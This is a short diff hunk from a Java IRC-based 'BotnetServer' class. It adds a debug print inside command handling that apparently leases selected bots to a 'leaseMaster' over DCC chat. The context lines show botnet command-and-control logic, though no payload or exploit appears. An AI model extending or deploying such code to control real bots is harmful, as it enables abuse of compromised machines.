@@ -223,6 +223,7 @@ public class BotnetServer extends PircBot {
 				String leaseMaster = parts[1];
 				long duration = Long.parseLong(parts[2]);
 				String[] bots = chooseBots(parts, 3);
+				System.out.println(Arrays.toString(parts));
 				DccChat chat = dccSendChatRequest(leaseMaster, TIMEOUT);
 				String botNames = bots[0];
 				for (String name : bots) {
